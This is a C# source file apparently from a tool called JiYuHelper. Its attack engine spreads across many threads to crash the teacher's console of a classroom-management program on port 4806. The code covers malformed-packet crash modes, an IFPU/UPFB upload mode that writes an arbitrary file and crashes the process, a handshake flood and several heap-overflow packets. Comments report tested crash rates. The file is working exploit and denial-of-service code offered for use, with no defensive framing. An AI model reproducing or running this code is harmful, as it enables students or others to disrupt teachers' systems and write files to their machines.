using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace JiYuHelper.Core;

public enum AttackMode
{
    FileSubmitCrash = 0,
    AnswerSheetCrash = 1,
    UpfbUploadCrash = 2,
    WorbFlood = 3,
    QrmsOverflow = 4,
    RfsaOverflow = 5,
    QdatOverflow = 6,
    BlkcOverflow = 7,
    PgijOverflow = 8,
}

public class AttackStats
{
    public long PacketsSent;
    public long BytesSent;
    public long ConnectFailures;
    public long SendFailures;
    public long Crashes;      // 观察到连接被重置/目标无响应
    public long ActiveThreads;
}

/// <summary>
/// 攻击引擎: 多线程向教师端 4806 端口发起攻击
/// </summary>
public class AttackEngine : IDisposable
{
    private volatile bool _running;
    private readonly List<Thread> _threads = new();
    private CancellationTokenSource? _cts;

    public AttackStats Stats { get; } = new();
    public bool IsRunning => _running;

    public event Action<AttackMode, string>? CrashDetected;

    /// <summary>全部攻击线程退出时触发 (自然结束 / 手动停止)</summary>
    public event Action? Stopped;

    public AttackMode Mode { get; private set; }
    public string TargetIP { get; private set; } = "";

    public void Start(string targetIP, AttackMode mode, int threadCount, int durationSeconds)
    {
        if (_running) return;

        TargetIP = targetIP;
        Mode = mode;
        _running = true;
        _cts = new CancellationTokenSource();
        _threads.Clear();

        Stats.PacketsSent = 0;
        Stats.BytesSent = 0;
        Stats.ConnectFailures = 0;
        Stats.SendFailures = 0;
        Stats.Crashes = 0;
        Stats.ActiveThreads = 0;

        Logger.Attack($"攻击开始: {ModeName(mode)} @ {targetIP} x{threadCount}线程 / {durationSeconds}s");

        for (int i = 0; i < threadCount; i++)
        {
            var t = new Thread(() => Worker(durationSeconds, _cts.Token));
            t.IsBackground = true;
            t.Start();
            _threads.Add(t);
            Interlocked.Increment(ref Stats.ActiveThreads);
        }
    }

    public void Stop()
    {
        if (!_running) return;
        _running = false;
        _cts?.Cancel();

        foreach (var t in _threads)
        {
            if (t.IsAlive && !t.Join(1500))
            {
                // 线程可能阻塞在 connect/recv, 强制结束
                try { t.Interrupt(); } catch { }
            }
        }
        _threads.Clear();

        Logger.Info("攻击已停止");
    }

    private void Worker(int durationSeconds, CancellationToken ct)
    {
        var sw = Stopwatch.StartNew();
        try
        {
            while (_running && sw.Elapsed.TotalSeconds < durationSeconds && !ct.IsCancellationRequested)
            {
                try
                {
                    switch (Mode)
                    {
                        case AttackMode.FileSubmitCrash:
                            FileSubmitCrashOnce(ct);
                            break;
                        case AttackMode.AnswerSheetCrash:
                            AnswerSheetCrashOnce(ct);
                            break;
                        case AttackMode.UpfbUploadCrash:
                            UpfbUploadCrashOnce(ct);
                            break;
                        case AttackMode.WorbFlood:
                            WorbFloodOnce(ct);
                            break;
                        case AttackMode.QrmsOverflow:
                            OverflowOnce(AttackMode.QrmsOverflow, ct);
                            break;
                        case AttackMode.RfsaOverflow:
                            OverflowOnce(AttackMode.RfsaOverflow, ct);
                            break;
                        case AttackMode.QdatOverflow:
                            OverflowOnce(AttackMode.QdatOverflow, ct);
                            break;
                        case AttackMode.BlkcOverflow:
                            OverflowOnce(AttackMode.BlkcOverflow, ct);
                            break;
                        case AttackMode.PgijOverflow:
                            OverflowOnce(AttackMode.PgijOverflow, ct);
                            break;
                    }
                }
                catch (SocketException)
                {
                    Interlocked.Increment(ref Stats.ConnectFailures);
                }
                catch (Exception)
                {
                    Interlocked.Increment(ref Stats.SendFailures);
                }

                // 攻击间隔 2s, 避免空转
                try { ct.WaitHandle.WaitOne(2000); } catch { }
            }
        }
        finally
        {
            // 最后一个线程退出时通知 UI
            if (Interlocked.Decrement(ref Stats.ActiveThreads) == 0)
            {
                _running = false;
                Logger.Info($"攻击已结束: {ModeName(Mode)} @ {TargetIP} (总发包 {Stats.PacketsSent}, 崩溃信号 {Stats.Crashes})");
                Stopped?.Invoke();
            }
        }
    }

    /// <summary>
    /// FILESUBMIT 崩溃攻击: WORB 握手 + 576 字节畸形包
    /// 观察连接被重置 => 教师端已崩溃
    /// </summary>
    private void FileSubmitCrashOnce(CancellationToken ct)
        => CommandCrashOnce(PacketBuilder.BuildFileSubmitCrashPacket(), ct);

    /// <summary>
    /// ANSWERSHEET 崩溃攻击: 与 FILESUBMIT 共用 sub_5661e0 case2 崩溃点
    /// 实测触发更快 (8s 内 15 次崩溃信号)
    /// </summary>
    private void AnswerSheetCrashOnce(CancellationToken ct)
        => CommandCrashOnce(PacketBuilder.BuildAnswerSheetCrashPacket(), ct);

    /// <summary>
    /// IFPU+UPFB 上传崩溃攻击: 任意文件写入 + 教师端进程崩溃
    /// 实测: 每次 UPFB 写入均崩溃教师端 (100% 触发)
    /// </summary>
    private void UpfbUploadCrashOnce(CancellationToken ct)
    {
        byte[] worb = PacketBuilder.BuildWorbPacket();
        byte[] guid = PacketBuilder.BuildTestGuid();
        byte[] data = Encoding.ASCII.GetBytes("JiYuHelper UPFB upload " + Guid.NewGuid().ToString("N"));

        // 目标文件: 公共临时目录 (可配置)
        string targetFile = @"C:\Windows\Temp\jy_upload.tmp";
        byte[] ifpu = PacketBuilder.BuildIfpuUploadPacket(guid, targetFile, (uint)data.Length);
        byte[] upfb = PacketBuilder.BuildUpfbDataPacket(guid, data);

        using var client = new TcpClient(AddressFamily.InterNetwork);
        client.NoDelay = true;
        client.ReceiveTimeout = 3000;
        client.SendTimeout = 3000;

        var ip = IPAddress.Parse(TargetIP);
        client.Connect(new IPEndPoint(ip, PacketBuilder.ControlPort));

        // WORB 握手
        client.GetStream().Write(worb, 0, worb.Length);
        Interlocked.Increment(ref Stats.PacketsSent);
        Interlocked.Add(ref Stats.BytesSent, worb.Length);
        ct.WaitHandle.WaitOne(100);

        // IFPU 初始化
        client.GetStream().Write(ifpu, 0, ifpu.Length);
        Interlocked.Increment(ref Stats.PacketsSent);
        Interlocked.Add(ref Stats.BytesSent, ifpu.Length);

        // 读 RFPU 确认
        try
        {
            byte[] buf = new byte[64];
            client.GetStream().Read(buf, 0, buf.Length);
        }
        catch { }

        ct.WaitHandle.WaitOne(200);

        // UPFB 数据块 (触发崩溃)
        client.GetStream().Write(upfb, 0, upfb.Length);
        Interlocked.Increment(ref Stats.PacketsSent);
        Interlocked.Add(ref Stats.BytesSent, upfb.Length);

        // 连接被重置/EOF => 教师端崩溃
        try
        {
            byte[] buf = new byte[64];
            int n = client.GetStream().Read(buf, 0, buf.Length);
            if (n == 0)
            {
                Interlocked.Increment(ref Stats.Crashes);
                Logger.Success($"[崩] UPFB 写入后连接关闭, 教师端已崩溃 ({TargetIP})");
                CrashDetected?.Invoke(Mode, TargetIP);
            }
        }
        catch (IOException)
        {
            Interlocked.Increment(ref Stats.Crashes);
            Logger.Success($"[崩] UPFB 写入后连接被重置, 教师端已崩溃 ({TargetIP})");
            CrashDetected?.Invoke(Mode, TargetIP);
        }
        catch (SocketException)
        {
            Interlocked.Increment(ref Stats.Crashes);
            Logger.Success($"[崩] UPFB 写入后连接异常, 教师端已崩溃 ({TargetIP})");
            CrashDetected?.Invoke(Mode, TargetIP);
        }
    }

    /// <summary>
    /// 命令层崩溃攻击通用流程: WORB 握手 + 畸形命令包
    /// 观察连接被重置/EOF => 教师端已崩溃
    /// </summary>
    private void CommandCrashOnce(byte[] crash, CancellationToken ct)
    {
        byte[] worb = PacketBuilder.BuildWorbPacket();

        using var client = new TcpClient(AddressFamily.InterNetwork);
        client.NoDelay = true;
        client.ReceiveTimeout = 3000;
        client.SendTimeout = 3000;

        var ip = IPAddress.Parse(TargetIP);
        client.Connect(new IPEndPoint(ip, PacketBuilder.ControlPort));

        client.GetStream().Write(worb, 0, worb.Length);
        Interlocked.Increment(ref Stats.PacketsSent);
        Interlocked.Add(ref Stats.BytesSent, worb.Length);

        // 等 100ms 让教师端处理握手
        ct.WaitHandle.WaitOne(100);

        client.GetStream().Write(crash, 0, crash.Length);
        Interlocked.Increment(ref Stats.PacketsSent);
        Interlocked.Add(ref Stats.BytesSent, crash.Length);

        // 尝试读取: 连接被重置/EOF => 教师端崩溃
        try
        {
            byte[] buf = new byte[256];
            int n = client.GetStream().Read(buf, 0, buf.Length);
            if (n == 0)
            {
                Interlocked.Increment(ref Stats.Crashes);
                Logger.Success($"[崩] 连接关闭, 教师端可能已崩溃 ({TargetIP})");
                CrashDetected?.Invoke(Mode, TargetIP);
            }
        }
        catch (IOException)
        {
            Interlocked.Increment(ref Stats.Crashes);
            Logger.Success($"[崩] 连接被重置, 教师端已崩溃 ({TargetIP})");
            CrashDetected?.Invoke(Mode, TargetIP);
        }
        catch (SocketException)
        {
            Interlocked.Increment(ref Stats.Crashes);
            Logger.Success($"[崩] 连接异常终止, 教师端已崩溃 ({TargetIP})");
            CrashDetected?.Invoke(Mode, TargetIP);
        }
    }

    /// <summary>
    /// WORB 握手轰炸: 高频连接 + WORB 后立即断开
    /// </summary>
    private void WorbFloodOnce(CancellationToken ct)
    {
        byte[] worb = PacketBuilder.BuildWorbPacket();

        using var client = new TcpClient(AddressFamily.InterNetwork);
        client.NoDelay = true;
        client.ReceiveTimeout = 2000;
        client.SendTimeout = 2000;

        var ip = IPAddress.Parse(TargetIP);
        client.Connect(new IPEndPoint(ip, PacketBuilder.ControlPort));
        client.GetStream().Write(worb, 0, worb.Length);

        Interlocked.Increment(ref Stats.PacketsSent);
        Interlocked.Add(ref Stats.BytesSent, worb.Length);

        ct.WaitHandle.WaitOne(50);
    }

    /// <summary>
    /// 堆溢出攻击通用流程: WORB 握手 + 构造溢出包
    /// </summary>
    private void OverflowOnce(AttackMode mode, CancellationToken ct)
    {
        byte[] worb = PacketBuilder.BuildWorbPacket();
        byte[] payload = BuildOverflowPacket(mode);

        using var client = new TcpClient(AddressFamily.InterNetwork);
        client.NoDelay = true;
        client.ReceiveTimeout = 3000;
        client.SendTimeout = 3000;

        var ip = IPAddress.Parse(TargetIP);
        client.Connect(new IPEndPoint(ip, PacketBuilder.ControlPort));
        client.GetStream().Write(worb, 0, worb.Length);

        ct.WaitHandle.WaitOne(100);

        client.GetStream().Write(payload, 0, payload.Length);
        Interlocked.Increment(ref Stats.PacketsSent);
        Interlocked.Add(ref Stats.BytesSent, payload.Length);

        try
        {
            byte[] buf = new byte[256];
            int n = client.GetStream().Read(buf, 0, buf.Length);
            if (n == 0)
            {
                Interlocked.Increment(ref Stats.Crashes);
                Logger.Success($"[崩] {mode} 触发连接关闭 ({TargetIP})");
                CrashDetected?.Invoke(mode, TargetIP);
            }
        }
        catch (IOException)
        {
            Interlocked.Increment(ref Stats.Crashes);
            Logger.Success($"[崩] {mode} 连接被重置, 教师端可能已崩溃 ({TargetIP})");
            CrashDetected?.Invoke(mode, TargetIP);
        }
        catch (SocketException) { }
    }

    private static byte[] BuildOverflowPacket(AttackMode mode)
    {
        return mode switch
        {
            AttackMode.QrmsOverflow => PacketBuilder.BuildQrmsOverflowPacket(200),
            AttackMode.RfsaOverflow => PacketBuilder.BuildRfsaOverflowPacket(),
            AttackMode.QdatOverflow => PacketBuilder.BuildQdatOverflowPacket(),
            AttackMode.BlkcOverflow => PacketBuilder.BuildBlkcOverflowPacket(),
            AttackMode.PgijOverflow => PacketBuilder.BuildPgijOverflowPacket(120),
            _ => PacketBuilder.BuildFileSubmitCrashPacket(),
        };
    }

    public static string ModeName(AttackMode mode)
    {
        return mode switch
        {
            AttackMode.FileSubmitCrash => "FILESUBMIT 协议崩溃",
            AttackMode.AnswerSheetCrash => "ANSWERSHEET 协议崩溃",
            AttackMode.UpfbUploadCrash => "UPFB 上传崩溃",
            AttackMode.WorbFlood => "WORB 握手轰炸",
            AttackMode.QrmsOverflow => "QRMS 堆溢出",
            AttackMode.RfsaOverflow => "RFSA 答题堆溢出",
            AttackMode.QdatOverflow => "QDAT 块溢出",
            AttackMode.BlkcOverflow => "BLKC 块溢出",
            AttackMode.PgijOverflow => "PGIJ 成员名溢出",
            _ => "未知",
        };
    }

    public void Dispose()
    {
        Stop();
    }
}
